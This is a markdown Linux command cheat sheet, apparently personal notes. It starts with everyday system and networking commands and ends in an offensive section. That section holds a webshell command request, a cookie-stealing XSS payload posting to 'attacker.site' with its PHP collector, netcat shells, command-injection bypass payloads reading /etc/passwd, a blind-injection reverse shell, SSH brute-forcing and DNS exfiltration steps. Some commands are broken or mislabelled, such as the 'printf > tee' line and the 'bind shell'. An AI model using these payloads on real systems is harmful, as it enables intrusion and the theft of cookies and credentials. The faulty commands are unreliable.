# Linux Commands Guide

## System Commands
### List number of lines in a file
```shell
wc -l filename.txt
```
### List contents of a file
```shell
cat filename.txt
```
### Create new folder
```shell
mkdir foldername
```
### Delete a file
```shell
rm filename
```
### Delete a folder
```shell
rm -rf foldername
```
### Delete a protected file
```shell
sudo rm filename
```
### Create empty file (1)
```shell
touch filename
```
### Create empty file (2)
```shell
printf " " > tee filename
```
### Print line with specific word in a file
```shell
cat filename | grep -i "word"
```
### Skip lines with specific word and print all else
```shell
cat filename | grep -v "word"
```
### Navigate inside a folder
```shell
cd foldername
```
### Navigate to home folder
```shell
cd
```
### Locate a file path
```shell
locate filename
```
### List contents of a folder
```shell
ls
```
### List contents of a folder with extra information
```shell
ls -l
```
### Navigate to home folder directories from any other folder
```shell
cd ~/directory_inside_your_home_folder
```
### Get status of a system service
```shell
sudo service service_name status
```
### TRIM the system
```shell
sudo fstrim -a -v
```
### Clean APT
```shell
sudo apt autoremove && sudo apt clean
```
### Copy a file to folder
```shell
sudo cp filename ~/Pictures/foldername
```
### Change ownership of a file
```shell
sudo chown username:username filename 
```
### Change ownership of all files in current folder
```shell
sudo chown username:username *
```
### Give read/write/execute/change rights to a script
```shell
sudo chmod +x scriptname.ext
```
### Run script with default script interpreter
```shell
./scriptname
```
### Terminal system resource monitoring
```shell
htop
```
### Scan current machine connections, filter for only tcp and udp with https
```shell
netstat -a | grep -E "tcp|udp" | grep -i "https"
```
### Scan system ports using tcp and udp
```shell
netstat -pn | grep -E "tcp|udp"
```
### Print only proccess id and process name
```shell
ps | awk ''{print $1"\t"$4}'
```
### Detailed processes without tl garbage
```shell
ps -aux | awk '{print $1"\t"$2"\t"$NF}'
```
### Find system users and app users
```shell
awk -F ":" '{print " | "$1" | "$6" | "$7" | "}' /etc/passwd
```
### Find installed shells
```shell
awk -F "/" '/^\// {print $NF}' /etc/shells | uniq | sort
```
### Default shell history without line numbers
```shell
history | awk '{$1=""; sub(" ", " "); print}'
```
### ZSH history without garbage
```shell
cat ~/.zsh_history | awk -F ":" '{$1="";$2=""; sub(" ", " "); print}' | awk -F ";" '{$1=""; sub(" ", " "); print}'
```
### Find installed shells
```shell
awk -F "/" '/^\// {print $NF}' /etc/shells | uniq | sort
```
### One line sys recon
```shell
print "\n=== Routing Tables ===\n" && netstat -r && print "\n\n=== Ports Scan ===\n" && netstat -pn | grep -E "tcp|udp" && print "\n\n=== Active Connections ===\n" && netstat -a | grep -E "tcp|udp" | grep -i "https" && print "\n\n=== Active Front Processes ===\n" && ps | awk '{print $1"\t"$4}' && print "\n\n=== Active All Processes ===\n" && ps -aux | awk '{print $1"\t"$2"\t"$NF}' && print "\n\n=== App Users ===\n" && awk -F ":" '{print " | "$1" | "$6" | "$7" | "}' /etc/passwd && print "\n\n=== Installed Shells ===\n" && awk -F "/" '/^\// {print $NF}' /etc/shells | uniq | sort
```
### Get server header and body using Netcat
```shell
nc -v website.com 80
```
Use openssl for https traffic

## Regex Commands
### Match all line containing a work
```
[\s\S].(WORD).*[\s\S]
```
### Match everything before the word including the word itself
```
^(.*?WORD) ?
```
### Regex Cheatsheet
| Name | Symbol | Pure Regex |
| --- | --- | --- |
| Caret | ^ | ^ |
| Digit | \d | [0-9] |
| Not Digit | \D | ```[^\d]``` |
| Word | \w | [a-zA-z0-9] |
| Not Word | \W | ```[^\w]```|
| Whitespace | \s | [\f\n\r\t\v] |
| Not Whitespace | \S | ```[^\s]``` |

## Error Management Commands
### APT timezone or cert mismatch error (temporary fix) solution
```shell
sudo apt-get -o Acquire::Check-Valid-Until=false -o Acquire::Check-Date=false update
```
### Screen tear solutions
1. Add the following line
```
i915.enable_psr=0
```
Inside:
```
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
```
After ***splash***
2. Install Compton compositor
```
sudo apt -y install compton
```
 For XFCE:
 ```
 xfconf-query -c xfwm4 -p /general/use_compositing -s false
 
 rm -rf ~/.config/xfce4/ && sudo reboot
 ```
3. Goto compositor options of your ‘display settings’ and select ‘no compositor’ or any other option (IF you don't want any compositor!)
4. ONLY use if driver issues persist - disable nouveau modeset
```
nouveau.modeset=0
```
Inside the line after ***splash***
```
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
```
### Restart networking
```shell
sudo systemctl restart NetworkManager.service
```
### Name resolution failure solution
1. Try to restart dnsmasq service:  ```sudo service dnsmasq restart```
2. Create and add google dns in resolver: ```sudo touch /etc/resolv.conf``` and add ```nameserver 8.8.8.8``` inside it.
	1. Restart resolv service: ```sudo systemctl restart systemd-resolved.service && sudo service systemd-resolved status```
### List network service running on specific port
```shell
sudo netstat -ltnp | grep -w ':8080'
```
### List service running on port
```shell
lsof -i :8080
```
### List running process by name
```shell
ps -fA | grep python
```
### Kill a process using process ID
```shell
kill 81211
```
### Kill all specific application name processes
```shell
kill -9 $(ps -A | grep python | awk '{print $1}')
```
### Kill all specific application name processes
```shell
kill -9 $(ps -A | grep python | awk '{print $1}')
```

## Using Extra Scripts/Tools
### List contents of a file, filter by lines with specific word and add inside new file
```shell
cat old_file | grep -i "word_to_filter" | anew new_file
```
### Open proxified firefox custom profile
```shell
proxychains firefox -p profile_name
```
### Run anything under proxy
```shell
proxychains script_name
```
### Clone GitHub repository faster
```shell
git clone --depth=1 https://github.com/username/reponame.git
```
### Open a file inside Sublime Text
```shell
subl filename
```
### OpenVPN Connection
```shell
sudo openvpn the_ovpn_file.ovpn
```
### SSH Connection
```shell
ssh username@servername
```
### Route through an IP
```shell
ip route add 192.168.220.0/24 via 10.10.24.1
```
### RDP connection
```shell
rdesktop 192.168.200.10
```
### Python simple http server
Start in new terminal!
```shell
sudo python -m SimpleHTTPServer 80
```


## Offensive Tool Commands
### Find subdomains of a website and save to file
```shell
assetfinder domain.com | anew filename
```
### Find if subdomains of website are alive or not
```shell
cat subdomain_list_file | httprobe | anew probed_urls
```
### Get all current and previous urls of a domain
```shell
gau domain.com | anew all_urls
```
### Perform request to webshell with command / C&C
```shell
curl -X POST https://website.com/assets/somefolder/cli.PNG -d "_=command"
```
### Inject JS payload inside image
```shell
python BMPinjector.py -i image.bmp "<scRiPt y='><'>/*<sCRipt* */prompt()</script"
```
### Get all parameters in a domain
```shell
python3 ~/ParamSpider/paramspider.py --domain https://www.website.com/ -o ~/WorkingDirectory/website_directory/pspider
```
### SQLMap tampers
```shell
--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```
### Basic XSS url fuzzing
```shell
python3 ~/XSStrike/xsstrike.py -u https://website.com/param=FUZZ --fuzzer
```
### Clean memory items and cache on run
```shell
sudo pandora bomb
```
### Google dorking
```shell
godork -q "inurl:search.php=" -p 50 | tee results.txt
```
### Google dorking + proxychains
```shell
proxychains godork -q "inurl:search.php=" -p 50 | tee results.txt
```
### Directory bruteforcing
```shell
gobuster dir -url https://website.com/ | anew dirs && dirb https://website.com | anew dirs
```
### Using packetwhisper to exfil data using DNS
1. ```mkdir tmpwork && cd tmpwork && wget  [https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip](https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip)```
2. Start python simple http server
3. Goto victims machine & open outbound port
4. Generate powershell cmd & start wireshark on attacker machine
5. On victim machine, execute generated powershell code
### Ping sweep
```shell
fping -a -g 10.0.2.15/24 2> /dev/null

nmap -sn 10.0.2.15/24
```
### Find service versions of services on server
```shell
sudo nmap -sV -F -sS ip_addr
```
### Netcat bind shell
Attacker machine:
```shell
nc -lvp 1337 -e /bin/bash
```
Victim machine:
```shell
nc -v attackerip 1337
```
### JS payload - post to attacker
On victim asset:
```shell
<script> var i = new Image(); i.src="https://attacker.site/get.php?cookie="+escape(document.cookie) </script>
```
On attacker website:
```php
<?php  
  
$ip = $_SERVER['REMOTE_ADDR'];  
$browser = $_SERVER['HTTP_USER_AGENT'];  
  
$fp = fopen('jar.txt', 'a');  
fwrite($fp, $ip.' '.$browser."\n");  
fwrite($fp, urldecode($_SERVER['QUERY_STRING'])."\n\n");  
fclose($fp);
```
### Bruteforcing SSH using hydra
```shell
hydra server_ip_addr ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Password/rockyou-10.txt -f -V
```
### Airodump - Get chaninel specific traffic - filter by enc type
```shell
airodump-ng --channel 1 wlan0 / airodump-ng --channel 1 --encrypt WPA1 wlan0
```
### Airodump - Sniff all bands and channels
```shell
airodump-ng --band abg wlan0
```
### Airodump - filter by channel / essid
```shell
airodump-ng --channel 1,2,3,4 / --essid AP_NAME
```
### Get Original AP / MITM detection (part) by BSSID + ESSID filter
```shell
airodump-ng --band abg wlan0 / --essid AP_NAME / --bssid MAC_ADDRESS_OF_ORIGINAL_DEVICE
```
### Command Injection filter bypass - reflected
1. Using command seperate: ```; pwd```
2. Using command append: ```&& cat /etc/passwd```
3. Using pipe: ```| cat /etc/passwd```
4. Using quoted command - add quotes for any character in word (EX:```cat/et"c"/p"a"ssw"d"```)
5. Using wildcards - replace any word with "```*```" & "```?```" (EX:```cat /etc/pa*wd``` or ```cat /etc/p?sswd```)
6. Using null vars - add ``` `` ``` in between words (EX:```cat /e``tc/p``asswd```)
7. Multi bypass - reverse encoded + multi bypass filters - (EX:``` |cat /"e"t``c/p?sswd ```)
7. Lethal injection - (EX:```"dws?ap/c``t"e"/ tac" | rev```)

Fuzzing for bypass: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/command-injection.md

```"dws?ap/c``t"e"/ tac" | rev```

### Command Injection filter bypass - blind
1. Test reflection
On victim asset:
```shell
127.0.0.1 | nc ip_addr_attacker port_number
```
On attacker machine:
```shell
nc -lvp port_number
```
2. If reflection success, get reverse shell
On victim asset:
```shell
127.0.0.1 | nc ip_addr_attacker port_number -e /bin/bash
```
On attacker machine:
```shell
python -c "import pty:pty.spawn('/bin/bash')"
```
